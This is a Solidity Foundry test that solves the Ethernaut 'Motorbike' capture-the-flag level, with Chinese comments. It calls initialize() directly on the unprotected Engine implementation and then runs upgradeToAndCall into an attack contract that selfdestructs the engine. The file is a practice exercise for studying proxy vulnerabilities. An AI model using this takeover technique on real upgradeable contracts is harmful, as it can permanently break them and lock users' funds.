pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {Motorbike, Engine, AttackMotorbike} from "../src/Motorbike.sol";


/** 
 * 解题思路：构造一个新的合约，再升级的时候调用 selfdestruct 方法来自毁
 * 在 ethernaut 的线上版本中还有一个步骤就是要去 storage 合约中找到 engine 的 address
 */
contract HackMotorbikeTest is Test {
    address hacker = address(hacker);
    address hacker1 = address(11111111);
    Engine public e;
    Motorbike public m;
    AttackMotorbike public am;

    function setUp() public {
        vm.deal(hacker, 1 ether);
    }
    function testHackMotorbike() public {
        vm.startPrank(hacker);
        e = new Engine();
        m = new Motorbike(address(e));
        am = new AttackMotorbike();

        // 初始化一次，获得合约的升级权限
        e.initialize();

        // 调用升级合约的自毁功能，这样 engine 无法再升级和调用
        address payable d1 = payable(hacker1);
        bytes memory de = abi.encodeWithSignature("destory(address)", d1);
        e.upgradeToAndCall(address(am), de);
        
        vm.stopPrank();
    }
}